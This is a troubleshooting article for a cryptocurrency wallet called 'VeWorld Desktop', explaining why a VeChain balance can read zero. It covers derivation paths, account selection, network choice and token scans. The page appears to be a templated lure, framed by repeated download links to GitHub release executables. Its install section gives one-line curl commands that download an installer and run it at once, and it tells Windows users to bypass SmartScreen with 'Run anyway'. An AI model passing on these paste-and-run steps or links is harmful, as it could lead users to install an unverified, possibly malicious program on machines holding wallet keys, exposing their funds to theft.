![VeWorld Desktop](../assets/banner-article.png)

# Check VeChain Balance: Why VeWorld Desktop Shows Zero

Usually a different address or a different network

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

A zero balance in VeWorld Desktop almost always means the app is looking at a different address or a different network, not that the funds have gone. Compare the 0x address on screen with the one that received the deposit, and check the same address in a block explorer before doing anything else.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You restored, imported or reinstalled a wallet and the account opens empty. Or a deposit you watched arrive in an explorer does not appear in the app, or a balance that was visible yesterday reads zero today after switching accounts.

| What the screen shows | Most likely cause | The check that settles it |
|---|---|---|
| Empty account after a restore | Different derivation path used | Compare addresses, then retry with the custom path |
| Empty account after switching accounts | A sibling address is selected | Open the account picker and compare |
| Empty for one token only | Token not yet detected | Refresh the account |
| Balance appears, then disappears | Network or account changed underneath | Confirm the selector, then re-read |
| Everything zero including history | Wrong network selected | Switch to VeChainThor and re-read |

## Why it happens

An address is derived, not remembered. A phrase produces an address through a deterministic process, and the process has parameters - most importantly the derivation path. Import the same phrase with a different path and you get a different, valid, empty address. Nothing is wrong with the phrase or the wallet; the account being displayed is simply not the one holding the balance.

Accounts multiply in ordinary use. Creating a second account, adding a Ledger whose device exposes several indexes, and importing an old keystore each add an address to the app. The header shows one at a time, and the wrong selection looks exactly like a vanished balance.

Networks produce the same symptom instantly. VeChainThor addresses share the 0x format with other EVM chains, so a wallet pointed at another network will read the same address there and find nothing, with no error and no delay. This is also why a wrong-network deposit is dangerous: the transaction is valid on the chain it was sent on, and the address on VeChainThor never receives it.

Deposit timing explains a smaller but commoner case. A transfer appears in an explorer as soon as it is included in a block, while an app that reads on demand may show the previous state until it reads again. The gap is seconds rather than hours, and refreshing rather than sending a second transfer is the right response.

Finally, tokens differ from native balances. <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md">VET in VeWorld Desktop</a> and <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md">VTHO on the same address</a> belong to the account directly, while VIP-180 tokens and NFTs are contract entries discovered by scanning the address. A scan that has not run, or ran before a transfer landed, leaves a funded account looking partly empty until it is repeated.

## Fix

1. Copy the address from the account header and compare it with the address that received the funds, character by character at both ends.
2. Open the account picker and check whether another account is selected; switch and re-read the balance.
3. Confirm the network selector is on VeChainThor rather than a test network.
4. Paste the address into a block explorer. If the explorer shows the balance, the chain is correct and the app is reading something else.
5. If the address on screen is not the one you expected after an import, go back to the import and use the custom derivation path option.
6. Refresh the account to trigger a fresh token scan before concluding that a token is missing.

## If that did not work

If the explorer shows the balance at the exact address the app displays and the app still reads zero, the local snapshot is stale. Close the account, reopen it, and let the read complete before touching anything else.

If the account is a Ledger account, confirm the device is connected and the same account index is selected. A Ledger exposes a series of addresses, and the app shows whichever one was added; a different index is a different account.

If a restore produced an address that no explorer recognises at all, the phrase may belong to another network's derivation convention. Try the alternate path options before assuming the phrase is wrong.

## Prevention

- Note the 0x address when an account is created, so a later restore can be compared against it.
- Keep one account for receiving and confirm it is selected before reading balances.
- Verify large deposits in an explorer rather than waiting for the app to agree.
- Never enter the recovery phrase into a website or a chat, and keep it offline so a restore is always possible.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Can funds disappear from an address?

Only through a transaction signed by the key holder. An address's balance changes when something is sent from it, not because a wallet displays it differently.

### Why does the explorer show my balance but the app does not?

Because the app is reading a different account, a different network, or a stale snapshot. The explorer answers for the address itself.

### Why did my balance show correctly yesterday?

Something changed: an account switch, a network switch, or an update that reset the selected account. The balance on chain is unaffected by any of them.

### Does importing a wallet move the funds?

No. Importing reproduces the address, and the funds never leave it. An empty result means the wrong address was derived.

### What if the address is definitely right and the balance is still zero?

Treat it as a display problem: refresh, reopen the account, and update the app. The chain, not the screen, holds the record.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [What a restored wallet should look like](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md)
- [Where VTHO and VET balances live](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/vtho-wallet-in-veworld-desktop.md)
- [Why an older desktop wallet falls behind](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-sync-in-veworld-desktop.md)
- [Selecting the right Ledger account](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [Moving from the VeChainThor wallet without losing sight of the address](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-thor-wallet-to-veworld-desktop.md)